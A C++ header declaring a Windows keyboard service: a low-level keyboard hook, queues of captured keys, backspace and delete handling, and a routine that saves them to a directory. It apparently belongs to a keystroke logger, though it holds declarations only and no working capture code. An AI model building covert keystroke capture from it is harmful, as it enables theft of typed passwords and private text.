#pragma once
#include "tools.hpp"
#include "io.hpp"
#include "winfx.hpp"
#include "lrcdatawriter.hpp"
#include <thread>
#include <list>
#include <queue>
#include <string>
#include <sstream>
#include <fstream>

namespace services
{
	namespace keyboard
	{
		using namespace lrcdata;

		typedef std::list<PartKeyboard> PKList;
		typedef std::queue<PartKeyboard> PKQueue;

		static std::thread vkQueueThread;

		static bool isRunning = false;
		const char dir[] = KBD_DIR;

		static size_t vkEvents;
		static size_t vkRepeats;
		static size_t vkListCursorBegin;
		static size_t vkListCursor;
		static PKList vkList;
		static PKQueue vkQueue;
		static VKInfo lastKeyPressed;

		static HHOOK hhkLowLevelKybd = NULL;

		LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

		void run();
		void stop();
		void save();
		void processqueue();
		void processvk(VKInfo vkInfo);
		void onDelete();
		void onBackspace();
		void clear();

		bool isprintable(DWORD vkCode);
		bool vkcmp(VKInfo vk1, VKInfo vk2);
	}
}